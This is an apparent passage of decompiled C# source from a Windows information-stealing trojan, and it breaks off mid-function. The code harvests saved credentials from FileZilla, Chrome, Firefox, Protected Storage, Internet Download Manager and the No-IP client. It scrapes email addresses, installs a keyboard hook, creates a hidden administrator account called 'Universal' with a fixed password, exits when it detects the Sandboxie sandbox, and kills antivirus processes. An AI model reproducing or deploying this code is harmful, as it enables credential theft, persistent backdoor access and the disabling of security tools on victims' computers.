	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SizeofResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int LocalFree(int int_0);

	static void smethod_67(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string[] array = default(string[]);
		string[] array2 = default(string[]);
		string text5 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 491:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_004c;
						case 7:
							goto IL_0051;
						case 8:
							goto IL_006c;
						case 9:
							goto IL_0071;
						case 10:
							goto IL_008e;
						case 11:
							goto IL_00a3;
						case 14:
							goto IL_00b6;
						case 15:
						case 16:
							goto IL_00c4;
						case 17:
							goto IL_00d6;
						case 18:
						case 19:
							goto IL_00e4;
						case 20:
							goto IL_00f6;
						case 21:
						case 22:
							goto IL_0104;
						case 23:
							goto IL_0116;
						case 24:
							goto IL_0125;
						case 25:
							goto IL_0130;
						case 26:
							goto IL_0136;
						case 12:
						case 13:
							goto IL_013f;
						case 27:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 28:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0130:
					num5 = checked(num5 + 1);
					goto IL_0136;
					IL_0008:
					num = 2;
					text = Interaction.Environ("APPDATA") + "\\FileZilla\\recentservers.xml";
					goto IL_0020;
					IL_0020:
					num = 3;
					text2 = Conversions.ToString(1);
					goto IL_002a;
					IL_002a:
					num = 4;
					text3 = "\r\n";
					goto IL_0033;
					IL_0033:
					num = 5;
					text2 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().OpenTextFileReader(text).ReadToEnd();
					goto IL_004c;
					IL_004c:
					num = 6;
					text4 = null;
					goto IL_0051;
					IL_0051:
					num = 7;
					array = text2.Split(new char[1] { '\r' });
					goto IL_006c;
					IL_006c:
					num = 8;
					text2 = null;
					goto IL_0071;
					IL_0071:
					num = 9;
					array2 = array;
					num5 = 0;
					goto IL_007c;
					IL_007c:
					if (num5 >= array2.Length)
					{
						break;
					}
					text5 = array2[num5];
					goto IL_008e;
					IL_0136:
					num = 26;
					goto IL_007c;
					IL_008e:
					num = 10;
					if (text5.Contains("</Host>"))
					{
						goto IL_00a3;
					}
					goto IL_013f;
					IL_00a3:
					num = 11;
					text4 = text4 + text5 + text3;
					goto IL_013f;
					IL_013f:
					num = 13;
					if (text5.Contains("</Port>"))
					{
						goto IL_00b6;
					}
					goto IL_00c4;
					IL_00b6:
					num = 14;
					text4 = text4 + text5 + text3;
					goto IL_00c4;
					IL_00c4:
					num = 16;
					if (text5.Contains("</Protocol>"))
					{
						goto IL_00d6;
					}
					goto IL_00e4;
					IL_00d6:
					num = 17;
					text4 = text4 + text5 + text3;
					goto IL_00e4;
					IL_00e4:
					num = 19;
					if (text5.Contains("</User>"))
					{
						goto IL_00f6;
					}
					goto IL_0104;
					IL_00f6:
					num = 20;
					text4 = text4 + text5 + text3;
					goto IL_0104;
					IL_0104:
					num = 22;
					if (text5.Contains("</Pass>"))
					{
						goto IL_0116;
					}
					goto IL_0130;
					IL_0116:
					num = 23;
					text4 = text4 + text5 + text3 + text3;
					goto IL_0125;
					IL_0125:
					num = 24;
					form1_0.string_52 = text4;
					goto IL_0130;
					end_IL_0000_2:
					break;
				}
				num = 27;
				form1_0.string_52 = text4;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 491;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_68(Class41.Class44 class44_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class44_0.byte_0[class44_0.int_0++] = class44_0.byte_0[int_0++];
			class44_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int RegOpenKeyExA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, int int_2, ref int int_3);

	static void smethod_69(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 533:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_003a;
						case 6:
							goto IL_0059;
						case 7:
							goto IL_006f;
						case 5:
						case 8:
						case 9:
							goto IL_008c;
						case 10:
							goto IL_0093;
						case 11:
							goto IL_00b1;
						case 12:
							goto IL_00c8;
						case 13:
							goto IL_00df;
						case 14:
						case 15:
						case 16:
							goto IL_00fd;
						case 17:
							goto IL_0104;
						case 18:
							goto IL_0122;
						case 19:
							goto IL_0139;
						case 20:
						case 21:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 22:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0139:
					num = 19;
					form1_0.string_58 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "serial", null));
					break;
					IL_0007:
					num = 2;
					form1_0.string_56 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "Name", null));
					goto IL_0024;
					IL_0024:
					num = 3;
					if (Operators.CompareString(form1_0.string_56, "", false) == 0)
					{
						goto IL_003a;
					}
					goto IL_0059;
					IL_003a:
					num = 4;
					form1_0.string_56 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "FName", null));
					goto IL_008c;
					IL_0059:
					num = 6;
					if (Operators.CompareString(form1_0.string_56, "", false) == 0)
					{
						goto IL_006f;
					}
					goto IL_008c;
					IL_006f:
					num = 7;
					form1_0.string_56 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "name", null));
					goto IL_008c;
					IL_008c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0093;
					IL_0093:
					num = 10;
					form1_0.string_57 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "Email", null));
					goto IL_00b1;
					IL_00b1:
					num = 11;
					if (Operators.CompareString(form1_0.string_57, "", false) == 0)
					{
						goto IL_00c8;
					}
					goto IL_00fd;
					IL_00c8:
					num = 12;
					if (Operators.CompareString(form1_0.string_57, "", false) == 0)
					{
						goto IL_00df;
					}
					goto IL_00fd;
					IL_00df:
					num = 13;
					form1_0.string_57 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "email", null));
					goto IL_00fd;
					IL_00fd:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0104;
					IL_0104:
					num = 17;
					form1_0.string_58 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "Serial", null));
					goto IL_0122;
					IL_0122:
					num = 18;
					if (Operators.CompareString(form1_0.string_58, "", false) != 0)
					{
						break;
					}
					goto IL_0139;
					end_IL_0000_2:
					break;
				}
				num = 21;
				form1_0.string_59 = "+-------Idm Logins---------+\r\nIdm Username : " + form1_0.string_56 + "\r\n Idm Email :  " + form1_0.string_57 + "\r\n Idm Serial: " + form1_0.string_58 + "\r\n------------------------";
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 533;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_70()
	{
		if (Process.GetProcessesByName("SbieSvc").Length >= 1)
		{
			Environment.Exit(0);
		}
	}

	static void smethod_71(Form1 form1_0)
	{
		string text = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object)null));
		string string_ = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object)null));
		string text2 = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object)null));
		string string_2 = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object)null));
		string text3 = Conversions.ToString(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object)null));
		string text4 = "\r\n";
		form1_0.string_50 = text4 + "Username: " + text + text4 + "Password: " + Class34.smethod_47(form1_0, string_) + text4 + "Proxy Username:" + text2 + text4 + "Proxy Password: " + Class34.smethod_47(form1_0, string_2) + text4 + "Proxy Port: " + text3 + text4 + text4;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SetWindowsHookExA(int int_0, Form1.Class5.Delegate0 delegate0_0, int int_1, int int_2);

	static GInterface3 smethod_72()
	{
		GInterface3 ginterface3_ = null;
		Guid guid_ = Class19.guid_0;
		Class34.PStoreCreateInstance(ref ginterface3_, ref guid_, 0, 0);
		return ginterface3_;
	}

	[DllImport("kernel32")]
	static extern int lstrlen(IntPtr intptr_0);

	static ArrayList smethod_73(string string_0, string string_1)
	{
		ArrayList arrayList = new ArrayList();
		DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
		FileInfo[] files = directoryInfo.GetFiles(string_0);
		FileInfo[] array = files;
		string gparam_ = default(string);
		foreach (FileInfo fileInfo in array)
		{
			Console.WriteLine(fileInfo.FullName);
			StreamReader streamReader = File.OpenText(fileInfo.FullName);
			while (Class25.smethod_0(ref gparam_, streamReader.ReadLine()) != null)
			{
				string text = Class34.smethod_76(gparam_);
				if (Operators.CompareString(text, "", false) != 0 && !arrayList.Contains(text))
				{
					string pattern = "^([a-zA-Z0-9_\\-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([a-zA-Z0-9\\-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)$";
					Regex regex = new Regex(pattern);
					if (regex.IsMatch(text) && !arrayList.Contains(text))
					{
						arrayList.Add(text);
					}
				}
			}
		}
		return arrayList;
	}

	static void smethod_74(Form1 form1_0)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		SqlConnection val = default(SqlConnection);
		SqlCommand val2 = default(SqlCommand);
		SqlDataReader val3 = default(SqlDataReader);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		ListViewItem val4 = default(ListViewItem);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 528:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001d;
						case 4:
							goto IL_002b;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_004f;
						case 7:
							goto IL_0059;
						case 8:
							goto IL_0064;
						case 9:
							goto IL_0072;
						case 12:
							goto IL_0083;
						case 13:
							goto IL_0099;
						case 14:
							goto IL_00b0;
						case 15:
							goto IL_00cb;
						case 16:
							goto IL_00f7;
						case 17:
							goto IL_0102;
						case 18:
							goto IL_010e;
						case 19:
							goto IL_015b;
						case 10:
						case 11:
						case 20:
						case 21:
							goto IL_0170;
						case 22:
							goto IL_0180;
						case 23:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 24:
						case 25:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_015b:
					num = 19;
					form1_0.vmethod_88().set_Text(form1_0.string_46);
					goto IL_0170;
					IL_0008:
					num = 2;
					text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
					goto IL_001d;
					IL_001d:
					num = 3;
					if (!File.Exists(text))
					{
						goto end_IL_0000_3;
					}
					goto IL_002b;
					IL_002b:
					num = 4;
					val = new SqlConnection();
					goto IL_0035;
					IL_0035:
					num = 5;
					val.set_ConnectionString("Data Source=" + text + ";");
					goto IL_004f;
					IL_004f:
					num = 6;
					val.Open();
					goto IL_0059;
					IL_0059:
					num = 7;
					val2 = val.CreateCommand();
					goto IL_0064;
					IL_0064:
					num = 8;
					val2.set_CommandText("SELECT * FROM logins");
					goto IL_0072;
					IL_0072:
					num = 9;
					val3 = val2.ExecuteReader();
					goto IL_0170;
					IL_0170:
					num = 11;
					if (val3.Read())
					{
						goto IL_0083;
					}
					goto IL_0180;
					IL_0180:
					num = 22;
					((Component)(object)val2).Dispose();
					break;
					IL_0083:
					num = 12;
					text2 = Conversions.ToString(val3.get_Item("origin_url"));
					goto IL_0099;
					IL_0099:
					num = 13;
					text3 = Conversions.ToString(val3.get_Item("username_value"));
					goto IL_00b0;
					IL_00b0:
					num = 14;
					text4 = Class34.smethod_7((byte[])val3.get_Item("password_value"));
					goto IL_00cb;
					IL_00cb:
					num = 15;
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						goto IL_00f7;
					}
					goto IL_0170;
					IL_00f7:
					num = 16;
					val4 = new ListViewItem();
					goto IL_0102;
					IL_0102:
					num = 17;
					val4.set_Text(text2);
					goto IL_010e;
					IL_010e:
					num = 18;
					form1_0.string_46 = "---------------------------------------------\r\nWebsite: " + text2 + "\r\nUsername: " + text3 + "\r\nPassword: " + text4 + "\r\n---------------------------------------------\r\n ";
					goto IL_015b;
					end_IL_0000_2:
					break;
				}
				num = 23;
				val.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 528;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_75(Class17 class17_0)
	{
		return class17_0.string_1;
	}

	static string smethod_76(string string_0)
	{
		string text = null;
		int num = 0;
		string text2 = null;
		checked
		{
			int num2 = string_0.IndexOf("@", 0) + 1;
			int num3 = 1;
			int num4 = string_0.Length;
			text = "";
			if (num2 == 0)
			{
				return text;
			}
			for (num = num2 - 1; num >= 1; num += -1)
			{
				text2 = string_0.Substring(num - 1, 1);
				if ((Operators.CompareString(text2, " ", false) == 0) | (Operators.CompareString(text2, "<", false) == 0) | (Operators.CompareString(text2, "(", false) == 0) | (Operators.CompareString(text2, ":", false) == 0) | (Operators.CompareString(text2, ",", false) == 0) | (Operators.CompareString(text2, "[", false) == 0))
				{
					num3 = num + 1;
					break;
				}
			}
			int num5 = num2 + 1;
			int length = string_0.Length;
			for (num = num5; num <= length; num++)
			{
				text2 = string_0.Substring(num - 1, 1);
				if ((Operators.CompareString(text2, " ", false) == 0) | (Operators.CompareString(text2, ">", false) == 0) | (Operators.CompareString(text2, ")", false) == 0) | (Operators.CompareString(text2, ":", false) == 0) | (Operators.CompareString(text2, ",", false) == 0) | (Operators.CompareString(text2, "]", false) == 0))
				{
					num4 = num - 1;
					break;
				}
			}
			string input = string_0.Substring(num3 - 1, num4 - num3 + 1);
			input = Regex.Replace(input, "<(.|\\n)*?>", string.Empty);
			input = input.Replace("&nbsp;", "");
			input = input.Replace(" ", "");
			return input.Replace("\"", "");
		}
	}

	static string smethod_77()
	{
		string result = "";
		if (Class25.arrayList_1.Count > 0)
		{
			IEnumerator enumerator = Class25.arrayList_1.GetEnumerator();
			while (enumerator.MoveNext())
			{
				result = Convert.ToString(RuntimeHelpers.GetObjectValue(enumerator.Current));
			}
		}
		return result;
	}

	static void smethod_78()
	{
		try
		{
			Class34.smethod_62();
		}
		catch (Exception)
		{
		}
	}

	static byte[] smethod_79(Class12 class12_0)
	{
		byte[] array = null;
		int pcbData = default(int);
		IntPtr ppbData = default(IntPtr);
		class12_0.ginterface3_0.ReadItem(class12_0.enum1_0, ref class12_0.guid_0, ref class12_0.guid_1, class12_0.string_0, ref pcbData, ref ppbData, 0, 0);
		if (ppbData != IntPtr.Zero)
		{
			array = new byte[checked(pcbData - 1 + 1)];
			Marshal.Copy(ppbData, array, 0, pcbData);
			Class34.smethod_139(class12_0, ppbData);
		}
		return array;
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegOpenKeyExA", ExactSpelling = true, SetLastError = true)]
	static extern int RegOpenKeyExA_1(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, int int_2, ref int int_3);

	static void smethod_80()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		try
		{
			DirectoryEntry val = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
			DirectoryEntry val2 = val.get_Children().Add("Universal", "user");
			val2.Invoke("SetPassword", new object[1] { "Universalwashere" });
			val2.CommitChanges();
			DirectoryEntry val3 = val.get_Children().Find("Administrators", "group");
			if (val3 != null)
			{
				val3.Invoke("Add", new object[1] { val2.get_Path().ToString() });
			}
			try
			{
				string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
				Registry.SetValue(keyName, "Universal", 0, RegistryValueKind.DWord);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_81(Class41.Class46 class46_0, Class41.Class43 class43_0)
	{
		while (true)
		{
			switch (class46_0.int_2)
			{
			case 5:
			{
				int int_ = Class41.Class46.int_1[class46_0.int_7];
				int num = Class34.smethod_58(class43_0, int_);
				if (num >= 0)
				{
					Class34.smethod_56(class43_0, int_);
					num += Class41.Class46.int_0[class46_0.int_7];
					while (num-- > 0)
					{
						class46_0.byte_1[class46_0.int_8++] = class46_0.byte_2;
					}
					if (class46_0.int_8 == class46_0.int_6)
					{
						return true;
					}
					goto IL_009b;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class34.smethod_114(class46_0.class45_0, class43_0)) & -16) == 0)
				{
					class46_0.byte_1[class46_0.int_8++] = (class46_0.byte_2 = (byte)num2);
					if (class46_0.int_8 == class46_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class46_0.byte_2 = 0;
					}
					class46_0.int_7 = num2 - 16;
					class46_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class46_0.int_8 < class46_0.int_5)
				{
					int num3 = Class34.smethod_58(class43_0, 3);
					if (num3 >= 0)
					{
						Class34.smethod_56(class43_0, 3);
						class46_0.byte_0[Class41.Class46.int_9[class46_0.int_8]] = (byte)num3;
						class46_0.int_8++;
						continue;
					}
					return false;
				}
				class46_0.class45_0 = new Class41.Class45(class46_0.byte_0);
				class46_0.byte_0 = null;
				class46_0.int_8 = 0;
				class46_0.int_2 = 4;
				goto case 4;
			case 2:
				class46_0.int_5 = Class34.smethod_58(class43_0, 4);
				if (class46_0.int_5 >= 0)
				{
					class46_0.int_5 += 4;
					Class34.smethod_56(class43_0, 4);
					class46_0.byte_0 = new byte[19];
					class46_0.int_8 = 0;
					class46_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class46_0.int_4 = Class34.smethod_58(class43_0, 5);
				if (class46_0.int_4 >= 0)
				{
					class46_0.int_4++;
					Class34.smethod_56(class43_0, 5);
					class46_0.int_6 = class46_0.int_3 + class46_0.int_4;
					class46_0.byte_1 = new byte[class46_0.int_6];
					class46_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class46_0.int_3 = Class34.smethod_58(class43_0, 5);
				if (class46_0.int_3 >= 0)
				{
					class46_0.int_3 += 257;
					Class34.smethod_56(class43_0, 5);
					class46_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_009b:
			class46_0.int_2 = 4;
		}
	}

	static void smethod_82(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "avp", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_83(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "anubis", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_84(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "zlclient", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static long smethod_85()
	{
		IntPtr procAddress = Class34.GetProcAddress(Class21.intptr_0, "PK11_GetInternalKeySlot");
		Class21.Delegate4 @delegate = (Class21.Delegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class21.Delegate4));
		return @delegate();
	}

	static int smethod_86(IntPtr intptr_0, int int_0, StringBuilder stringBuilder_0, IntPtr intptr_1)
	{
		IntPtr procAddress = Class34.GetProcAddress(Class21.intptr_0, "NSSBase64_DecodeBuffer");
		Class21.Delegate6 @delegate = (Class21.Delegate6)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class21.Delegate6));
		return @delegate(intptr_1, intptr_0, stringBuilder_0, int_0);
	}

	static void smethod_87()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string executablePath = default(string);
		string text = default(string);
		string[] directories = default(string[]);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 304:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_001e;
						case 5:
							goto IL_003a;
						case 6:
							goto IL_0055;
						case 7:
